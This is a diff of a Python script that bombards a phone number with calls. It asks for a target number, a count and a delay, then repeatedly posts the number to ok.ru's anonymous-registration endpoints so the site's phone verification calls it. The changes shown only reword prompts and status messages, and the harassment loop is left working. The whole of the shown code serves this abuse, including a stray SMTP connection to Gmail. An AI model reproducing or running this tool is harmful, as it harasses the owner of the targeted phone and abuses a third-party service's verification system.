@@ -5,7 +5,7 @@ print("inter number to call:")
 i = int(input())
 print("How many?:")
 j = int(input())
-print("how many seconds?")
+print("how many seconds between the calls?")
 k = int(input())
 for v in range(j):
     s = smtplib.SMTP('smtp.gmail.com', 587)
@@ -20,10 +20,10 @@ for v in range(j):
     payload = {'st.r.phone': i}
     response = s.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                       data=payload)
-    print(response.status_code)
+    print("Calling "+str(i)+"  ... wait")
     payload2 = {'st.r.fieldAcceptCallUIButton': 'Call'}
     response = s.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",
                       data=payload2)
-    print(response.status_code, response.reason, str(v+1)+"/"+str(j))
+    print("done!", str(v+1)+"/"+str(j))
     time.sleep(k)
 
